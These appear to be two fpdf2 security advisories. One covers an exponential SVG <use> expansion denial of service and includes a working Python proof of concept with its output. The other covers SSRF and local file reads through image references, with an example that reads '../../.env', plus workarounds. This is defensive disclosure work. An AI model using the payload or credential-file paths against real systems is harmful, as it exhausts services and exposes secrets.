vulns.description: ### Summary  fpdf2 expands SVG `<use>` references by deep-copying the complete referenced graphics tree. A small SVG can use nested references to make the number of in-memory objects grow exponentially, causing excessive CPU and memory consumption during `FPDF.image()` processing.  This was reproduced with an 895-byte SVG on fpdf2 2.8.7. Under a 128 MB process limit, the input kept the process busy for about 14 seconds before raising `MemoryError`.   ### Details  The issue is in fpdf2's own SVG reference handling. It does not rely on XML entities, external URLs, local files, or vulnerable behavior in another dependency.  When fpdf2 resolves an SVG reference, [`SVGObject.build_xref()`](https://github.com/py-pdf/fpdf2/blob/a3307f96a0d165831029b3fb644aee5a7ca03328/fpdf/svg.py#L1584) passes the referenced object to `GraphicsContext.add_item()`:  ```python pdf_group.add_item(self.cross_references[ref]) ```  [`GraphicsContext.add_item()`](https://github.com/py-pdf/fpdf2/blob/a3307f96a0d165831029b3fb644aee5a7ca03328/fpdf/drawing.py#L3618-L3633) uses `clone=True` by default and deep-copies the object:  ```python def add_item(self, item, clone=True):     if clone:         item = deepcopy(item)     self.path_items.append(item) ```  An attacker can define `g1` as eight references to `g0`, `g2` as eight references to `g1`, and so on. Each level adds only a small amount of XML, but fpdf2 copies the entire tree from the previous level eight times. The resulting work grows approximately as `8^n`.  `ResourceAccessPolicy` does not prevent this behavior because the SVG contains only inline objects and does not request any external resource. The same failure was reproduced on development commit `a3307f96a0d165831029b3fb644aee5a7ca03328` with `ResourceAccessPolicy.NONE`.  ### PoC  This was tested on Linux with Python 3.13.5. The script applies a 128 MB address-space limit so the process fails safely instead of consuming all available system memory.  ```python import resource import time  from fpdf import FPDF   groups = ['<g id="g0"><rect width="1" height="1"/></g>'] for level in range(1, 6):     uses = f'<use href="#g{level - 1}"/>' * 8     groups.append(f'<g id="g{level}">{uses}</g>')  svg = (     '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'     '<defs>' + "".join(groups) + '</defs><use href="#g5"/></svg>' ).encode()  pdf = FPDF() pdf.add_page()  limit = 128 * 1024 * 1024 resource.setrlimit(resource.RLIMIT_AS, (limit, limit))  print(f"payload size: {len(svg)} bytes") started = time.perf_counter()  try:     pdf.image(svg, w=10) except MemoryError:     elapsed = time.perf_counter() - started     max_rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss     print(f"MemoryError after {elapsed:.3f}s, max RSS: {max_rss} KiB") ```  ```text payload size: 895 bytes MemoryError after 14.336s, max RSS: 115596 KiB ```  Execution time varies by machine, but the process should show heavy resource use and fail at the configured memory limit.  ### Impact  This is an uncontrolled resource consumption vulnerability affecting applications that pass user-controlled SVG data to `FPDF.image()`. A single crafted image can occupy a PDF generation worker for several seconds and then make the current job fail with `MemoryError`. Submitting the same input concurrently repeats the CPU and memory cost across the available workers, reducing or exhausting the service's PDF generation capacity.  The payload is less than 1 KB and requires no external resource access, XML entities, special network configuration, or permissive fpdf2 settings.

## Summary `fpdf2` implicitly dereferences image resource references supplied to rendering APIs. If an application passes untrusted HTML, SVG, template data, or image paths into those APIs, `fpdf2` may issue outbound HTTP(S) requests or attempt to open local filesystem paths. This behavior is relevant in applications that render untrusted or user-provided input without sanitizing or restricting embedded resource references. ## Description In affected versions, `fpdf2` uses a shared internal image-loading mechanism for multiple features. This loader: * fetches `http://` and `https://` URLs over the network * opens other string values as local filesystem paths During document processing, resource references embedded in input content are automatically dereferenced using this mechanism. This behavior is reachable through: * `FPDF.image()` * `FPDF.write_html()` via HTML `` * `FPDF.image()` when rendering SVG files containing `` or `xlink:href="...">` * template image elements that forward values into `FPDF.image()` If an application renders attacker-controlled input through these APIs, that input can cause: * outbound HTTP(S) requests to attacker-chosen destinations * local file open attempts for attacker-chosen paths This may enable Server-Side Request Forgery (SSRF) in applications that render untrusted content. Local file access impact is limited: the library attempts to open the referenced path, but successful embedding depends on the target being a valid and supported image or SVG resource. `file://` URLs are not specially handled; raw filesystem paths such as `/path/to/file` or `../../file.png` are the relevant local-path cases. ## Impact This issue affects applications that render untrusted or partially trusted content using `fpdf2`. Applications may be impacted if they: * pass untrusted HTML into `write_html()` * render untrusted SVG with embedded `` references * pass user-controlled strings into `image()` * allow untrusted template definitions or template field values to control image paths Potential impacts include: * outbound requests to internal or external network services * limited local file access attempts depending on file type and parsing success (limited to content that fpdf2 recognizes as a supported image or SVG resource) The severity depends on how `fpdf2` is integrated and whether untrusted input is allowed to control resource references. **Example scenarios** HTML: ```python pdf.write_html('') ``` SVG: ```xml ``` Direct image path: ```python pdf.image("../../.env") ``` **Workarounds** Applications can mitigate this by: - not rendering untrusted HTML, SVG, or template content - rejecting user-controlled `src` / `href` / image-path values - mapping resources through an application-defined allowlist - converting user-supplied images to trusted in-memory objects before passing them to `fpdf2` **Credits** - @kule500 for identifying SSRF via HTML handling - @BudongJW for identifying SVG resource loading as an additional vector - @redyank for analysis of the shared image loading mechanism - @manop55555 for identifying a DNS rebinding bypass in the initial REMOTE_PUBLIC implementation
